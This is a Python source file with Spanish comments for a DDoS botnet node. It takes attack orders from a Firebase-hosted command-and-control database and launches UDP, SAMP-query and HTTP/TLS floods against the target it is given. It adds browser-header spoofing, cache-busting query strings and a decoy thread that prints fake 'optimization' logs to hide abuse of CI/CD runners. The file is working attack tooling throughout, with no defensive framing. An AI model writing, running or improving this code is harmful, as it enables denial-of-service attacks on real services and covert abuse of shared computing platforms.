import asyncio
import aiohttp
import time
import random
import ssl
import socket
import threading
import multiprocessing
import struct
import math
import sys

# --- CONFIGURACION CENTRAL ---
# Asegurate de que estas URLs sean las correctas de tu proyecto
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

def github_disguise_engine():
    """
    Simula procesos de mantenimiento y calculos para evitar deteccion
    de uso abusivo de recursos en entornos de CI/CD.
    """
    while True:
        try:
            # Simulacion de carga de trabajo analitica
            data_sample = [random.random() for _ in range(10000)]
            _avg = sum(data_sample) / len(data_sample)
            # Print de debug aislado para engañar al log
            print(f"[*] Optimization Step: {math.sqrt(_avg)}")
            time.sleep(random.uniform(5, 10))
        except:
            pass

def get_modern_user_agents():
    """Retorna headers realistas para evitar bloqueos de WAF/DStat"""
    versions = ["130.0.0.0", "131.0.0.0", "132.0.0.0"]
    v = random.choice(versions)
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Cache-Control": "no-cache"
    }

# --- MOTOR LAYER 4 (UDP / SAMP) ---
def layer4_executor(ip, port, duration, method):
    """
    Ejecutor de Capa 4 optimizado para IPs sin proteccion.
    Utiliza paquetes de tamaño maximo para saturar el dstat.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Aumentar el buffer de envio del sistema para evitar cuellos de botella
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
    
    if method == ".samp":
        try:
            octets = [int(i) for i in ip.split('.')]
            # Payload real de consulta de servidor SAMP
            payload = b"SAMP" + struct.pack('BBBB', *octets) + struct.pack('H', int(port)) + b'i'
        except:
            payload = random._urandom(1024)
    else:
        # 1472 bytes es el limite maximo de Ethernet sin fragmentar
        payload = random._urandom(1472)

    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            # Enviamos rafagas para reducir el overhead de Python
            for _ in range(100):
                sock.sendto(payload, (ip, int(port)))
        except (socket.error, socket.herror):
            time.sleep(0.01) # Pausa breve si el buffer se llena
        except:
            break
    sock.close()

# --- MOTOR LAYER 7 (TLS / BYPASS) ---
async def layer7_executor(target, duration, semaphore, method):
    """
    Ejecutor de Capa 7 con bypass de gateway 504.
    Fuerza al servidor a procesar peticiones dinamicas.
    """
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    
    conn = aiohttp.TCPConnector(limit=0, ssl=ssl_ctx, family=socket.AF_INET)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            async with semaphore:
                try:
                    # Bypass de cache dinámico
                    cache_bypass = f"?q={random.getrandbits(32)}&t={time.time()}"
                    full_url = target + cache_bypass
                    headers = get_modern_user_agents()
                    
                    if method == ".tls":
                        async with session.post(full_url, headers=headers) as r:
                            await r.release()
                    else:
                        async with session.get(full_url, headers=headers) as r:
                            await r.release()
                except:
                    continue

def start_l7_process(target, duration, method):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Semaforo alto para permitir concurrencia masiva
    sem = asyncio.Semaphore(2000)
    tasks = [layer7_executor(target, duration, sem, method) for _ in range(250)]
    loop.run_until_complete(asyncio.gather(*tasks))

# --- COORDINADOR DE COMANDOS ---
async def main_orchestrator():
    node_id = f"N-{random.randint(1000, 9999)}"
    # Hilo de camuflaje
    threading.Thread(target=github_disguise_engine, daemon=True).start()
    
    async with aiohttp.ClientSession() as session:
        last_stamp = ""
        while True:
            try:
                # Reporte de estado al C2
                await session.put(f"{NODES_URL}/{node_id}.json", json={"id": node_id, "t": time.time()})
                
                # Obtener comandos de Firebase
                async with session.get(f"{DB_URL}.json") as resp:
                    data = await resp.json()
                
                if data and data.get('stamp') != last_stamp:
                    last_stamp = data['stamp']
                    method = data.get('method')
                    target = data.get('target')
                    duration = int(data.get('time', 0))
                    
                    if duration > 0:
                        if ".udp" in method or ".samp" in method:
                            host, port = target.split(':')
                            # Lanzar 500 hilos de Capa 4
                            for _ in range(500):
                                threading.Thread(
                                    target=layer4_executor, 
                                    args=(host, int(port), duration, method),
                                    daemon=True
                                ).start()
                        else:
                            # Lanzar Capa 7 en procesos paralelos (Multicore)
                            for _ in range(multiprocessing.cpu_count()):
                                p = multiprocessing.Process(
                                    target=start_l7_process, 
                                    args=(target, duration, method)
                                )
                                p.start()
            except Exception as e:
                pass
            await asyncio.sleep(3)

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main_orchestrator())

